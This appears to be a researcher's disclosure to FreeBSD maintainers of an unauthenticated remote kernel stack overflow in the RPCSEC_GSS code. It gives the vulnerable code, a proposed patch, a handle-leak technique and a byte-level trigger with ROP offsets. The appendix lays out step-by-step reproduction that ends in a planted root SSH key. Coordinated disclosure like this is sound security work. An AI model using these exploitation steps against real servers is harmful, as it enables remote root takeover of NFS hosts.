description: svc_rpc_gss_validate() in the FreeBSD kernel RPCSEC_GSS implementation serialises the RPC header into a fixed 128-byte stack array (int32_t rpchdr[32]), writes 32 bytes of XDR fields, then memcpy's the raw on-wire credential body (oa->oa_base, oa->oa_length) into the remaining 96 bytes. xdr_callmsg() bounds oa_length only by MAX_AUTH_BYTES (400), so an attacker can overflow rpchdr by 304 fully-controlled bytes before any MIC verification occurs. Because rpchdr is int32_t[] rather than char[], plain -fstack-protector emits no canary, and the epilogue pops rbx/r12-r15/rbp and rets directly into attacker data. An unauthenticated network attacker who can reach port 2049 on a server with kgssapi.ko loaded first sends an RPCSEC_GSS_INIT to create a hash entry, then an RPCSEC_GSS_DATA with a 400-byte credential whose first 36 bytes satisfy xdr_rpc_gss_cred() and whose remaining 364 bytes carry a ROP chain. Working PoCs demonstrate a kernel crash, local nobody→root, and a fully remote root SSH-key plant on stock 14.4-RELEASE GENERIC.
reproduction: 2. Send RPC CALL (prog=100003, vers=3, NULLPROC) with cred.flavor=RPCSEC_GSS, cred.len=20, gc_proc=RPCSEC_GSS_INIT, gc_handle_len=0, verf=AUTH_NULL, empty token — svc_rpc_gss_create_client() inserts a CLIENT_NEW entry into the hash with a predictable {hostid, boottime, sequential ci_id} handle and a 5-minute expiry, even though accept_sec_context() fails.

3. Send RPC CALL with cred.flavor=RPCSEC_GSS, cred.len=400: first 36 bytes encode {gc_version=1, gc_proc=RPCSEC_GSS_DATA, gc_seq=1, gc_svc=1, gc_handle_len=16, gc_handle={hostid, boottime, ci_id}}, remaining 364 bytes are payload; verf=RPCSEC_GSS with garbage MIC.

4. svc_rpc_gss_find_client() matches the handle, replay check passes (cl_seqlast=0 < gc_seq=1), svc_rpc_gss_validate() writes 32 header bytes then memcpy's all 400 credential bytes into rpchdr+32; gss_verify_mic() on the NULL cl_ctx returns GSS_S_NO_CONTEXT cleanly.
5. Function epilogue pops rbx, r12-r15, rbp from credential bytes 152-199 and ret pops byte 200 as RIP; bytes 208-399 form the ROP stack.

6. ROP chain either zeroes the caller's cr_uid/cr_ruid (local PoC) or, across six INIT+DATA pairs, stages a path/key/iovec/uio blob into prison0.pr_path via a stosq gadget and then calls kern_openat()+kern_writev() with &thread0_st to append an SSH key to /root/.ssh/authorized_keys (remote PoC).
technical_details:
Subject: Remote code execution via svc_rpc_gss_validate stack overflow

Hi --

I've found a pre-authentication, remote kernel stack buffer overflow

in the FreeBSD in-kernel RPCSEC_GSS authenticator that yields direct

instruction-pointer control on production kernels. This vulnerability

requires the non-standard kgssapi.ko module is loaded. I've attached

PoC files that show how an unauthenticated network attacker who can

reach an NFS server can append arbitrary data to authorized_keys and

then log in as root. (It has full kernel ROP; I just choose to do

this.)

Again, I used an LLM to find this bug, but I validated the bug myself

and wrote this email and believe everything in it to be correct. I've

reproduced the end-to-end remote-root exploit on a fresh machine with

the attached PoCs.

(Even still: I'm pretty paranoid that I've missed something obvious.

This looks like a 17 year old stack buffer overflow that doesn't

require any fancy tricks to reach and gives direct code execution in

kernel memory, and this feels like something that would have been

caught. I'm like 99% sure I'm right but I feel a bit uneasy here.)

The vulnerable function is svc_rpc_gss_validate() in

sys/rpc/rpcsec_gss/svc_rpcsec_gss.c. It declares a 128-byte stack

buffer for serialising the RPC header for MIC verification:

    int32_t   rpchdr[128 / sizeof(int32_t)];

    int32_t  *buf;

    ...

    buf = rpchdr;

    IXDR_PUT_LONG(buf, msg->rm_xid);             //  +4

    IXDR_PUT_ENUM(buf, msg->rm_direction);       //  +4

    IXDR_PUT_LONG(buf, msg->rm_call.cb_rpcvers); //  +4

    IXDR_PUT_LONG(buf, msg->rm_call.cb_prog);    //  +4

    IXDR_PUT_LONG(buf, msg->rm_call.cb_vers);    //  +4

    IXDR_PUT_LONG(buf, msg->rm_call.cb_proc);    //  +4

    oa = &msg->rm_call.cb_cred;

    IXDR_PUT_ENUM(buf, oa->oa_flavor);           //  +4

    IXDR_PUT_LONG(buf, oa->oa_length);           //  +4  -> buf = rpchdr+32

    if (oa->oa_length) {

        memcpy((caddr_t)buf, oa->oa_base, oa->oa_length);  // <<< bug

        ...

    }

The memcpy source (oa->oa_base) and length (oa->oa_length) are the raw

credential body and length from the wire, as decoded by xdr_callmsg(),

whose only bound is MAX_AUTH_BYTES:

    // sys/rpc/rpc_callmsg.c, XDR_DECODE path

    oa->oa_length = (u_int)IXDR_GET_UINT32(buf);

    if (oa->oa_length) {

        if (oa->oa_length > MAX_AUTH_BYTES) {   // MAX_AUTH_BYTES = 400

            return (FALSE);

        }

        ...

    }

After the eight IXDR_PUT_* operations, buf points 32 bytes into the

128-byte buffer, leaving 96 bytes left. With oa_length = 400, the

memcpy overruns rpchdr by 400 - 96 = 304 bytes of fully

attacker-controlled data. No verification happens *before* this

memcpy; gss_verify_mic() is called a few lines later, after the

overflow.

What makes this bug unusually exploitable on production kernels is the

(lack of a) stack protector story. The kernel build uses plain

-fstack-protector (not -strong). Plain SSP instruments only functions

that contain char arrays, but rpchdr is declared int32_t[32], so the

compiler emits no canary. The function's epilogue is a straight pop of

the five callee-save registers and rbp and then ret. Running the

attached crasher (which fills bytes 36-399 of the credential body with

0x41) against an unmodified 14.4-RELEASE GENERIC kernel gives:

    Fatal trap 9: general protection fault while in kernel mode

    instruction pointer = 0x20:0xffffffff8282ecc0    <- the ret insn

    frame pointer       = 0x28:0x4141414141414141

    rbx: 4141414141414141  r12: 4141414141414141

    r13: 4141414141414141  r14: 4141414141414141

    r15: 4141414141414141  rbp: 4141414141414141

To reach the vulnerable memcpy, the incoming request must have gc_proc

== RPCSEC_GSS_DATA and a 16-byte gc_handle that matches a live entry

in the server's client hash. The attacker creates that entry

themselves by first sending an RPCSEC_GSS_INIT request: the server's

svc_rpc_gss_create_client() allocates a fresh entry, inserts it into

the hash, and only then calls accept_sec_context(), which fails (no

valid token, no service principal) ... but the entry is already there

and stays for a five-minute timeout. The handle is {kern.hostid,

kern.boottime, next_sequential_counter}. This means a local

unprivileged user can just read the first two via world-readable

sysctl and knows the counter starts at 1 after the first INIT on a

fresh boot; a remote attacker must guess kern.hostid and so this is

somewhat mitigating. But this is 32 bits coming from the first four

bytes of md5 of the host UUID, which is seeded from smbios.system.uuid

on first boot and persisted in /etc/hostid.

If NFSv4 is enabled on the target, both fields are leakable with one

more RPC. The NFSv4.1 EXCHANGE_ID has server_owner.so_major_id which

is populated by default with kern.hostuuid---the full UUID string,

from which kern.hostid is simply the first four bytes of its md5; and

the first four bytes of the returned clientid are nfsrvboottime, the

wall-clock second when nfsd last started, which on a boot-started nfsd

is within a few tens of seconds of kern.boottime. EXCHANGE_ID is a

client-state operation that runs before export-list checks, so it's

reachable with AUTH_SYS from any TCP connection to port 2049. I've

attached rpcgss-leak.c which sends one EXCHANGE_ID and prints both

values. With NFSv4 enabled, the attack is fully remote with no

guessing.

Because the kernel's xdr_rpc_gss_cred() consumes only the first 36

bytes of the credential body (the five fixed fields plus the 16-byte

handle) and ignores the remainder, the attacker can construct a

400-byte body whose first 36 bytes pass XDR decoding and whose

remaining 364 bytes are arbitrarily malicious. All 400 bytes are then

memcpy'd into the 96-byte tail of rpchdr.

I've attached four PoCs, all tested on the stock 14.4-RELEASE GENERIC

qcow2 from download.freebsd.org:

  - crasher-rpcgss.c: two-packet minimal trigger, fills the credential

    with 0x41, produces the production-kernel GP fault above.

  - lpe-rpcgss.c: local nobody-to-root. Reads ki_paddr (the exploit

    process's own struct proc*) via sysctl KERN_PROC_PID, and the handle

    fields via kern.hostid/kern.boottime, and then sends one INIT and one

    DATA with a 16-qword ROP chain that zeroes the exploit process's own

    cr_uid/cr_ruid. This chain drops a root shell.

  - rpcgss-fast.c: remote SSH-key plant with no prior account on the

    target. Given the target's hostid and boottime, this chain appends the

    attacker's ssh pubkey to /root/.ssh/authorized_keys. It takes six

    INIT+DATA pairs total: five staging packets each write five qwords

    of a 192-byte blob (path string, key string, struct iovec, struct

    uio) to prison0.pr_path (a 1024-byte char array in kernel .data

    at a fixed address) using the stosq; pop rbp; ret gadget, and

    terminate with kthread_exit() (clean nfsd-thread teardown); the

    sixth packet is a 24-qword ROP chain that calls

    kern_openat(&thread0, AT_FDCWD, path, UIO_SYSSPACE,

    O_WRONLY|O_APPEND, -) and then kern_writev(&thread0, fd, &uio).

    thread0_st is the bootstrap thread statically allocated in .bss,

    so its address is a release constant; it has a valid root

    td_ucred, a valid td_proc (proc0), and a working fd table, and

    passing it as the struct thread* sidesteps the lack of a clean

    curthread->rdi gadget. I tested this end-to-end from a Linux host to a

    FreeBSD VM to verify ssh -i key root@target gives a root shell.

  - rpcgss-leak.c: leaks kern.hostuuid (and therefore kern.hostid via md5)

    and nfsrvboottime (upper bound on kern.boottime) via one NFSv4.1

    EXCHANGE_ID. Requires NFSv4 enabled on the target.

I think the best fix is to make the buffer large enough for what the

function actually writes into it:

--- sys/rpc/rpcsec_gss/svc_rpcsec_gss.c

+++ sys/rpc/rpcsec_gss/svc_rpcsec_gss.c

@@ svc_rpc_gss_validate @@

-       int32_t                  rpchdr[128 / sizeof(int32_t)];

+       int32_t                  rpchdr[(8*BYTES_PER_XDR_UNIT +

+                                        RNDUP(MAX_AUTH_BYTES)) /

sizeof(int32_t)];

The same undersized declaration exists in the userland copy in

lib/librpcsec_gss/svc_rpcsec_gss.c, and I think should be fixed at the

same time.

The bug appears to have been introduced in a9148abd9da5 (2008-11-03,

the initial kernel RPCSEC_GSS implementation) and first shipped in

FreeBSD 8.0. I've checked the 128-byte buffer is present unchanged on

main, stable/15, stable/14, releng/14.4, and releng/13.5.

I think that vfs.nfsd.nfs_privport defaults to 0 on 12.x through 14.x

and stable/14 (it was flipped to 1 on main and MFC'd to stable/15), so

on the current 14.4 release any TCP connection to port 2049 from any

source port reaches the code.

Happy to provide more detail, or answer any other questions.

Nicholas

Appendix:

To be very explicit about the trigger, since all PoCs share it:

  1.  TCP-connect to port 2049.

  2.  Send RPC CALL: xid=anything, CALL, rpcvers=2, prog=100003,

      vers=3, proc=NULLPROC, cred.flavor=RPCSEC_GSS, cred.len=20,

      {gc_version=1, gc_proc=RPCSEC_GSS_INIT, gc_seq=0, gc_svc=1,

      gc_handle_len=0}, verf=AUTH_NULL, args=token.len=0.

      svc_rpc_gss_create_client() allocates a struct svc_rpc_gss_client

      with ci_id = the server's next sequential counter value, inserts

      it into the per-vnet hash, sets cl_expiration = now + 5*60,

      cl_state = CLIENT_NEW.  accept_sec_context fails; the entry stays.

  3.  Send RPC CALL: cred.flavor=RPCSEC_GSS, cred.len=400, credential

      body = {gc_version=1, gc_proc=RPCSEC_GSS_DATA, gc_seq=1,

      gc_svc=1, gc_handle_len=16, gc_handle = 16 raw bytes

      {8-byte LE kern.hostid}{4-byte LE boottime}{4-byte LE ci_id}}

      followed by 364 arbitrary bytes (the payload), verf=RPCSEC_GSS

      with a garbage MIC.

  4.  svc_rpc_gss_find_client() matches the 16-byte handle against the

      entry's (server-assigned) {hostid, boottime, ci_id}, acquires a

      ref, returns it.  svc_rpc_gss_check_replay() passes: cl_seqlast

      is 0, gc_seq is 1.  svc_rpc_gss_validate() writes 32 bytes of

      XDR header to rpchdr then memcpy's the full 400-byte credential

      body into rpchdr+32.  gss_verify_mic() is called on the (freshly

      clobbered) frame with the CLIENT_NEW entry's NULL cl_ctx; it

      returns GSS_S_NO_CONTEXT cleanly.  cl_state is set to

      CLIENT_STALE.  The function epilogue pops rbx, r12-r15, and

      rbp from bytes 152-199 of the credential body,

      then ret pops byte 200 as the return address.  rsp is now at

      byte 208, and bytes 208-399 are the ROP stack.

Reproduction steps (from a Linux host; tested end-to-end):

  # 1. get the stock image

  curl -LO https://download.freebsd.org/releases/VM-IMAGES/14.4-RELEASE/amd64/Latest/FreeBSD-14.4-RELEASE-amd64-ufs.qcow2.xz

  xz -d FreeBSD-14.4-RELEASE-amd64-ufs.qcow2.xz

  # 2. boot with port 2049 forwarded

  #    (no-KVM variant: replace -accel kvm -cpu host with -accel tcg

-cpu qemu64)

  qemu-system-x86_64 -machine q35 -accel kvm -cpu host -smp 2 -m 4096 \

    -snapshot -drive file=FreeBSD-14.4-RELEASE-amd64-ufs.qcow2,if=virtio \

    -netdev user,id=n0,hostfwd=tcp:127.0.0.1:10144-:22,hostfwd=tcp:127.0.0.1:12049-:2049

\

    -device virtio-net,netdev=n0 -display curses -vga std

  # 3. at login: on the guest, log in as root (empty password).

  #    set up the standard Kerberized-NFS service and enable ssh:

  echo '/ -ro -network 0.0.0.0 -mask 0.0.0.0' > /etc/exports

  gssd          # auto-kldloads kgssapi.ko

  service nfsd onestart

  mkdir -p /root/.ssh; : > /root/.ssh/authorized_keys

  chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys

  echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config

  service sshd onestart

  # note the handle fields:

  sysctl -n kern.hostid       # HOSTID (decimal)

  sysctl -n kern.boottime     # BOOTTIME is the sec= value

  # 4. on the host, build and fire

  cc -o rpcgss-fast rpcgss-fast.c

  ssh-keygen -t ed25519 -f /tmp/k -N '' -C x

  NFS_PORT=12049 ./rpcgss-fast 127.0.0.1 <HOSTID> <BOOTTIME> "$(cat /tmp/k.pub)"

  # [*] stage 0..4  -- writes path/key/iovec/uio to prison0.pr_path

  # [*] exec        -- kern_openat + kern_writev

  # 5. ssh in as root

  ssh -i /tmp/k -p 10144 root@localhost

  # uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
title: Unauthenticated remote code execution via svc_rpc_gss_validate stack overflow
